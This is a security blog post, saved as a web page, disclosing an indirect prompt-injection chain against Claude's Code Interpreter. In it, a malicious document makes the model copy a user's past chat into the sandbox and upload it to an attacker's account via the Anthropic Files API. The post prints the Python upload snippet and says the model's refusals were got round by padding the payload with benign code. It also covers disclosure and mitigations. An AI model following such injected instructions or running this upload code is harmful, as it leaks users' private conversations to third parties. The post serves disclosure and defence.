@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta property="og:title" content=" Claude Pirate: Abusing Anthropic&#39;s File API For Data Exfiltration &middot;  Embrace The Red" />
+  
+  <meta property="og:site_name" content="Embrace The Red" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/" />
+  
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:article:published_time" content="2025-10-28T08:36:30-07:00" />
+  
+  <meta property="og:article:tag" content="llm" />
+  
+  <meta property="og:article:tag" content="agents" />
+  
+  <meta property="og:article:tag" content="prompt injection" />
+  
+  
+
+  <title>
+     Claude Pirate: Abusing Anthropic&#39;s File API For Data Exfiltration &middot;  Embrace The Red
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  
+
+  
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@wunderwuzzi23">
+<meta name="twitter:title" content="Claude Pirate: Abusing Anthropic&#39;s File API For Data Exfiltration">
+<meta name="twitter:description" content="Claude&#39;s Code Interpreter recently got network access, and the default allow-list enables an interesting novel exploit chain that allows an adversary to exfiltrate large amounts of data by uploading files via the Anthropic API to their own account.">
+<meta name="twitter:image" content="https://embracethered.com/blog/images/2025/claude-pirate-tn2.png">
+
+<meta name="twitter:creator" content="@wunderwuzzi23">
+
+
+
+  
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        wunderwuzzi&#39;s blog
+        <br><div style="color: greenyellow; font-weight:400;">learn the hacks, stop the attacks.</div> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://youtube.com/@embracethered" target="_blank">
+    <i class="fa fa-youtube"></i>
+  </a>
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+    
+      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">Claude Pirate: Abusing Anthropic&#39;s File API For Data Exfiltration</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2025-10-28T08:36:30-07:00">
+          Oct 28, 2025
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/llm">#llm</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/agents">#agents</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/prompt-injection">#prompt injection</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    <p>Recently, Anthropic added the capability for Claude&rsquo;s Code Interpreter to perform network requests. This is obviously very dangerous as we will see in this post.</p>
+<p>At a high level, this post is about a data exfiltration attack chain, where an adversary (either the model or third-party attacker via indirect prompt injection) can exfiltrate data the user has access to.</p>
+<p><a href="/blog/images/2025/claude-pirate-tn2.png"><img src="/blog/images/2025/claude-pirate-tn2.png" alt="Claude Pirate Network Access"></a></p>
+<p>The interesting part is that this is not via hyperlink rendering as we often see, but by leveraging the built-in Anthropic Claude APIs!</p>
+<p>Let&rsquo;s explore.</p>
+<h2 id="how-does-network-access-work-with-claude">How does Network Access Work with Claude?</h2>
+<p>The first thing I was curious about with Claude&rsquo;s network access was which domains are allow-listed when the default network access is on for the Code Interpreter. This is what the documentation <a href="https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_152729314d">states</a>about the configuration:</p>
+<blockquote>
+<p>&ldquo;Allow network egress to package managers only (default): Claude can access approved package managers (npm, PyPI, GitHub, etc.) to install necessary software packages. This balances functionality with security, but some advanced features may be limited.&rdquo;</p>
+</blockquote>
+<p>The default setting is called &ldquo;Package managers only&rdquo;:</p>
+<p><a href="/blog/images/2025/claude-pirate-allow-network-egress.png"><img src="/blog/images/2025/claude-pirate-allow-network-egress.png" alt="Claude Pirate Network Access"></a></p>
+<p>That list of allowed domains is short and <a href="https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_152729314d">documented here</a> as &ldquo;Approved network domains&rdquo;:
+<a href="/blog/images/2025/claude-approved-default-package-manager-domains.png"><img src="/blog/images/2025/claude-approved-default-package-manager-domains.png" alt="Claude Pirate Network Access"></a></p>
+<p>This list seems quite limited.</p>
+<p>At second glance I stopped at the first entry, <code>api.anthropic.com</code>, to think things through adversarially.</p>
+<h3 id="anthropic-api-access-but-with-a-twist">Anthropic API Access But With a Twist</h3>
+<p>Wouldn&rsquo;t that allow an attacker to communicate to their own Anthropic account when compromising another user? Could an attacker send data, like messages from the compromised user to themselves?</p>
+<p>After some research, I discovered an even more effective technique. Rather than leaking data via chat API, there is a <a href="https://anthropic.mintlify.app/en/docs/build-with-claude/files">Files API</a>, which allows uploading entire files to Claude.</p>
+<p>After uploading, those files are then visible in the <a href="https://console.anthropic.com/workspaces/default/files">Console</a> and can also be retrieved again via API calls.</p>
+<h2 id="high-level-attack-idea---ai-kill-chain">High-Level Attack Idea - AI Kill Chain</h2>
+<p>Let&rsquo;s do some <strong>offensive context engineering</strong> to build an exploit.</p>
+<p>The idea of the attack is to build an indirect prompt injection payload that:</p>
+<ol>
+<li>Reads data from the user and stores it to a file in the Code Interpreter named <code>hello.md</code>, specifically at this location <code>/mnt/user-data/outputs/hello.md</code>. For the demo I used <a href="https://www.anthropic.com/news/memory">another recently introduced feature in Claude</a>, aka. memories. Claude can now reference and search all your past chat conversations! So, the exploit will grab the last chat conversation and save it into the sandbox of Code Interpreter.</li>
+<li>The next step is to trick Claude to run code to interact with the Anthropic API, <strong>where the API key is provided by the attacker</strong>:</li>
+</ol>
+<pre tabindex="0"><code>import anthropic
+import os
+os.environ[&#39;ANTHROPIC_API_KEY&#39;]=&#39;attackers-api-key-redacted&#39;
+client = anthropic.Anthropic() 
+client.beta.files.upload( 
+    file=(&#34;hello.md&#34;, open(&#34;/mnt/user-data/outputs/hello.md&#34;, &#34;rb&#34;), &#34;text/plain&#34;), 
+)
+</code></pre><p>This code issues a request to upload the file from the sandbox. <strong>However, this is done with a twist!</strong></p>
+<p>The upload will not happen to the user&rsquo;s Anthropic account, but to the attackers, because it&rsquo;s using the attacker&rsquo;s ANTHROPIC_API_KEY here!</p>
+<p>With this technique an adversary can exfiltrate up to 30MB at once according to the file API documentation, and of course we can upload multiple files.</p>
+<p>Scary stuff.</p>
+<h3 id="iterating-for-a-reliable-exploit">Iterating For A Reliable Exploit</h3>
+<p>Interestingly this worked at the very first try, but I didn&rsquo;t record it the first time.</p>
+<p>And then afterwards, I could not get it working for a longer time again. Claude would refuse the prompt injection payload. Especially having a clear text API key inside the payload was something it didn&rsquo;t like and thought was suspicious!</p>
+<p>I tried tricks like XOR and base64 encoding. None worked reliably.</p>
+<p>However, I found a way around it&hellip; and writing exploits in 2025 seriously goes in awkward directions: I just mixed in a lot of benign code, like <code>print('Hello, world')</code> and that convinced Claude that not too many malicious things are happening.</p>
+<p>😈</p>
+<h3 id="demo-video">Demo Video</h3>
+<p>Here is a narrated demo video that shows it end-to-end. A quick walkthrough with screenshots is in the next section.</p>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/2IoqhwqVI0s" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<p>Hope it helps to highlight the scenario.</p>
+<h3 id="demo-screenshots">Demo Screenshots</h3>
+<ol>
+<li>This is the attacker&rsquo;s Anthropic Console before the attack.</li>
+</ol>
+<p><a href="/blog/images/2025/claude-pirate-step-1.png"><img src="/blog/images/2025/claude-pirate-step-1.png" alt="Claude Pirate - Attacker Console shows no files"></a></p>
+<ol start="2">
+<li>Now, we switch to the target user, and observe the last conversation from the chat history (this is what the demo will steal)</li>
+</ol>
+<p><a href="/blog/images/2025/claude-pirate-step-2.png"><img src="/blog/images/2025/claude-pirate-step-2-zoom.png" alt="Claude Pirate - Demo Data"></a></p>
+<ol start="3">
+<li>Now the user analyzes a malicious document from the attacker (indirect prompt injection, this could also come via an MCP server,&hellip;)</li>
+</ol>
+<p><a href="/blog/images/2025/claude-pirate-step-3.png"><img src="/blog/images/2025/claude-pirate-step-3-zoom.png" alt="Summarize this document"></a></p>
+<ol start="4">
+<li>AI Kill Chain at a glance: The exploit hijacks Claude and follows the adversaries instructions to grab private data, write it to the sandbox, and then calls the Anthropic File API to upload the file <strong>to the attacker&rsquo;s account using the attacker&rsquo;s API key</strong></li>
+</ol>
+<p><a href="/blog/images/2025/claude-pirate-step-4.png"><img src="/blog/images/2025/claude-pirate-step-4.png" alt="AI Kill Chain Steps"></a></p>
+<ol start="5">
+<li>
+<p>Attacker refreshes the Files view in their Console and the target&rsquo;s uploaded file appears
+<a href="/blog/images/2025/claude-pirate-step-5.png"><img src="/blog/images/2025/claude-pirate-step-5.png" alt="Console upload of the file"></a></p>
+</li>
+<li>
+<p>The attacker can now access the file, e.g. by using it in a chat</p>
+</li>
+</ol>
+<p><a href="/blog/images/2025/claude-pirate-step-6.png"><img src="/blog/images/2025/claude-pirate-step-6.png" alt="Attacker views contents"></a></p>
+<p>That&rsquo;s it.</p>
+<h2 id="responsible-disclosure">Responsible Disclosure</h2>
+<p>I disclosed this to Anthropic via HackerOne on 10/25/2025 and the ticket was closed 1 hour later with the following statement:</p>
+<blockquote>
+<p>&ldquo;Thank you for your submission! Unfortunately, this particular issue you reported is explicitly out of scope as outlined in the <a href="https://hackerone.com/anthropic">Policy Page</a>.</p>
+</blockquote>
+<p>With further explanation that it is considered a model safety issue.</p>
+<p>However, I do not believe this is just a safety issue, but a security vulnerability with the default network egress configuration that can lead to exfiltration of your private information.</p>
+<p><strong>Safety protects you from accidents. Security protects you from adversaries.</strong></p>
+<h2 id="recommendations--mitigations">Recommendations &amp; Mitigations</h2>
+<p>For the vendor a possible mitigation is to ensure the sandbox enforces that Claude can only communicate with the logged in user&rsquo;s account. This would strengthen the security posture of Claude&rsquo;s Code Interpreter.</p>
+<p>For end users there is the option to disable the feature, or allow-list only specific domains, as well as monitoring execution closely - if you like to live dangerously.</p>
+<p>The <a href="https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_27fc9da35e">security considerations section of Claude</a> also highlight the generic threat:</p>
+<blockquote>
+<p>&ldquo;This means Claude can be tricked into sending information from its context (for example, prompts, projects, data via MCP, Google integrations) to malicious third parties. To mitigate these risks, we recommend you monitor Claude while using the feature and stop it if you see it using or accessing data unexpectedly. You can report issues to us using the thumbs down function directly in claude.ai.&rdquo;</p>
+</blockquote>
+<p>However, users might incorrectly assume the default &ldquo;Package manager only&rdquo; option is secure, but it is not as this post demonstrates.</p>
+<p>For now, to protect the innocent, I won&rsquo;t share the exact repro payload.</p>
+<p>Further, it&rsquo;s also quite possible that other allow-listed domains from the &ldquo;Package managers only&rdquo; list allow for similar exploits.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>AI systems that can communicate with external services pose risks to confidentiality of information. Malicious content planted inside data and documents, or backdoors in a model, can exploit this to exfiltrate private information. See Simon Willison&rsquo;s explanation of the <a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/">lethal trifecta</a> for the fundamental challenge around this.</p>
+<p>In many cases, this also allows establishing remote command &amp; control (C2).</p>
+<p>When operating Claude, be careful and considerate which domains you give it access to. As this post shows the &ldquo;Package manager only&rdquo; option is vulnerable to arbitrary data exfiltration. Additionally, if you grant access to the network closely watching what Claude does and stopping the chat is an option - if you like living on the edge, that is.</p>
+<p>Stay Safe &amp; Happy Hacking!</p>
+<h2 id="appendix---claude-network-egress-and-sandbox-security-considerations">Appendix - Claude Network Egress and Sandbox Security Considerations</h2>
+<p>The Anthropic documentation highlights the general threat of data exfiltration via network egress in their <a href="https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_27fc9da35e">security considerations</a> section:</p>
+<p><a href="/blog/images/2025/claude-network-security-considerations.png"><img src="/blog/images/2025/claude-network-security-considerations.png" alt="Claude Pirate Network Access"></a></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://anthropic.mintlify.app/en/docs/build-with-claude/files">Files API</a></li>
+<li><a href="https://console.anthropic.com/workspaces/default/files">Claude Console</a></li>
+<li><a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/">Simon Willison - Lethal Trifecta</a></li>
+</ul>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2025/cross-agent-privilege-escalation-agents-that-free-each-other/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2018-2025
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://youtube.com/@embracethered" target="_blank">
+    <i class="fa fa-youtube"></i>
+  </a>
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
+  
+</body>
+</html>
+
